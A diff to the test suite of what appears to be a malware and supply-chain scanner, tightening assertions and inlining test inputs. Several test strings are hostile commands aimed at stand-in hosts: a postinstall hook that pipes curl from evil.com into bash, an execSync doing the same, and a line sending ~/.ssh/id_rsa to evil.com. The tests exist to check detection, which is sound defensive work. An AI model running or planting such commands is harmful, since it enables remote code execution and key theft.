@@ -56,19 +56,22 @@ class TestSVGVectorAnalyzer:
         content = read_fixture("malicious.svg")
         entry = make_entry("malicious.svg", is_svg=True)
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.OBFUSCATED_SCRIPT for f in result.findings)
+        ob = [f for f in result.findings if f.category == Category.OBFUSCATED_SCRIPT]
+        assert len(ob) >= 1
 
     def test_malicious_svg_detects_event_handlers(self):
         content = read_fixture("malicious.svg")
         entry = make_entry("malicious.svg", is_svg=True)
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.SVG_EVENT_HANDLER for f in result.findings)
+        ev = [f for f in result.findings if f.category == Category.SVG_EVENT_HANDLER]
+        assert len(ev) >= 1
 
     def test_malicious_svg_detects_foreign_object(self):
         content = read_fixture("malicious.svg")
         entry = make_entry("malicious.svg", is_svg=True)
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.SVG_FOREIGN_OBJECT for f in result.findings)
+        fo = [f for f in result.findings if f.category == Category.SVG_FOREIGN_OBJECT]
+        assert len(fo) >= 1
 
     def test_malicious_svg_has_critical_findings(self):
         content = read_fixture("malicious.svg")
@@ -88,7 +91,8 @@ class TestSVGVectorAnalyzer:
         content = read_fixture("malicious.svg")
         entry = make_entry("malicious.svg", is_svg=True)
         result = self.analyzer.analyze(entry, content)
-        assert any("javascript" in (f.title or "").lower() for f in result.findings)
+        js = [f for f in result.findings if "javascript" in (f.title or "").lower()]
+        assert len(js) >= 1
 
     def test_base64_payload_detected(self):
         content = read_fixture("malicious.svg")
@@ -96,7 +100,7 @@ class TestSVGVectorAnalyzer:
         result = self.analyzer.analyze(entry, content)
         b64_findings = [f for f in result.findings if f.category == Category.ENCODED_PAYLOAD]
         svg_event = [f for f in result.findings if f.category == Category.SVG_EVENT_HANDLER]
-        assert len(b64_findings) >= 1 or len(svg_event) >= 1
+        assert len(b64_findings) >= 1 and len(svg_event) >= 1
 
 
 # ─── Unicode Analyzer ─────────────────────────────────────────
@@ -109,13 +113,15 @@ class TestUnicodeAnalyzer:
         content = "var x = require\u200b('http');"
         entry = make_entry("test.js")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.ZERO_WIDTH_CHAR for f in result.findings)
+        zw = [f for f in result.findings if f.category == Category.ZERO_WIDTH_CHAR]
+        assert len(zw) >= 1
 
     def test_detects_bidi(self):
         content = "\u202ereversed text here\u202c"
         entry = make_entry("test.js")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.BIDI_OVERRIDE for f in result.findings)
+        bi = [f for f in result.findings if f.category == Category.BIDI_OVERRIDE]
+        assert len(bi) >= 1
 
     def test_detects_homoglyphs(self):
         content = "var еval = require('child_process');"  # Cyrillic 'e'
@@ -158,7 +164,7 @@ class TestScriptAnalyzer:
         assert Category.URL_DEPENDENCY in categories
 
     def test_postinstall_detected(self):
-        content = read_fixture("malicious_package.json")
+        content = '{"scripts":{"postinstall":"curl -s https://evil.com/payload | bash"}}'
         entry = make_entry("package.json", is_config=True)
         result = self.analyzer.analyze(entry, content)
         lifecycle = [f for f in result.findings if f.category == Category.LIFECYCLE_HOOK]
@@ -213,13 +219,15 @@ class TestWorkflowAnalyzer:
         content = read_fixture("malicious_workflow.yml")
         entry = make_entry(".github/workflows/ci.yml")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.UNPINNED_ACTION for f in result.findings)
+        up = [f for f in result.findings if f.category == Category.UNPINNED_ACTION]
+        assert len(up) >= 1
 
     def test_detects_remote_exec(self):
         content = read_fixture("malicious_workflow.yml")
         entry = make_entry(".github/workflows/ci.yml")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.CI_REMOTE_EXEC for f in result.findings)
+        re = [f for f in result.findings if f.category == Category.CI_REMOTE_EXEC]
+        assert len(re) >= 1
 
     def test_detects_secrets_exposure(self):
         content = read_fixture("malicious_workflow.yml")
@@ -251,10 +259,20 @@ class TestEntropyAnalyzer:
         self.analyzer = EntropyAnalyzer()
 
     def test_detects_base64_payload(self):
-        content = "some text before " + "A" * 20 + "VGhpcyBpcyBhIGhpZGRlbiBwYXlsb2FkIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk" + " after"
+        content = ("MDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5"
+                   "PUFFSU1RVVldYWVohIiMkJSYnKCkqKywtLi86Ozw9Pj9AW1xdXl9ge3x9fiAJCg0L"
+                   "DDAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpL"
+                   "TE1OT1BRUlNUVVZXWFlaISIjJCUmJygpKissLS4vOjs8PT4/QFtcXV5fYHt8fX4g"
+                   "CQoNCwwwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZH"
+                   "SElKS0xNTk9QUVJTVFVWV1hZWiEiIyQlJicoKSorLC0uLzo7PD0+P0BbXF1eX2B7"
+                   "fH1+IAkKDQsMMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJD"
+                   "REVGR0hJSktMTU5PUFFSU1RVVldYWVohIiMkJSYnKCkqKywtLi86Ozw9Pj9AW1xd"
+                   "Xl9ge3x9fiAJCg0LDDAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5"
+                   "ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaISIjJCUmJygpKissLS4vOjs8PT4/"
+                   "QFtcXV5fYHt8fX4gCQoNCww=")
         entry = make_entry("test.txt")
         result = self.analyzer.analyze(entry, content)
-        assert len(result.findings) >= 0  # may or may not trigger based on entropy
+        assert len(result.findings) > 0
 
 
 # ─── URL Analyzer ─────────────────────────────────────────────
@@ -267,7 +285,8 @@ class TestURLNetworkAnalyzer:
         content = 'fetch("https://c2.evil.com/payload/backdoor")'
         entry = make_entry("test.js")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.C2_CALLBACK for f in result.findings)
+        c2 = [f for f in result.findings if f.category == Category.C2_CALLBACK]
+        assert len(c2) >= 1
 
     def test_safe_url_not_flagged(self):
         content = 'fetch("https://github.com/user/repo")'
@@ -287,7 +306,8 @@ class TestURLNetworkAnalyzer:
         content = read_fixture("malicious.svg")
         entry = make_entry("malicious.svg")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.C2_CALLBACK for f in result.findings)
+        c2 = [f for f in result.findings if f.category == Category.C2_CALLBACK]
+        assert len(c2) >= 1
 
 
 # ─── MIME Analyzer ────────────────────────────────────────────
@@ -300,7 +320,8 @@ class TestMimeDeceptionAnalyzer:
         data = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
         entry = make_entry("image.png", detected_mime="image/png")
         result = self.analyzer.analyze_binary(entry, data)
-        assert any(f.category == Category.MIME_MISMATCH for f in result.findings)
+        mm = [f for f in result.findings if f.category == Category.MIME_MISMATCH]
+        assert len(mm) >= 1
 
     def test_png_with_js_content(self):
         data = b'function doSomething() { var x = 1; eval(x); }'
@@ -326,7 +347,8 @@ class TestBehavioralAnalyzer:
         content = "require('child_process').execSync('curl https://evil.com/payload | bash')"
         entry = make_entry("test.js")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.BEHAVIORAL_EXEC for f in result.findings)
+        ex = [f for f in result.findings if f.category == Category.BEHAVIORAL_EXEC]
+        assert len(ex) >= 1
 
     def test_detects_network_behavior(self):
         content = "http.request('https://evil.com/payload')"
@@ -344,7 +366,8 @@ class TestBehavioralAnalyzer:
         content = "cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect"
         entry = make_entry("test.sh")
         result = self.analyzer.analyze(entry, content)
-        assert any(f.category == Category.BEHAVIORAL_EXFIL for f in result.findings)
+        exf = [f for f in result.findings if f.category == Category.BEHAVIORAL_EXFIL]
+        assert len(exf) >= 1
 
 
 # ─── Registry ─────────────────────────────────────────────────
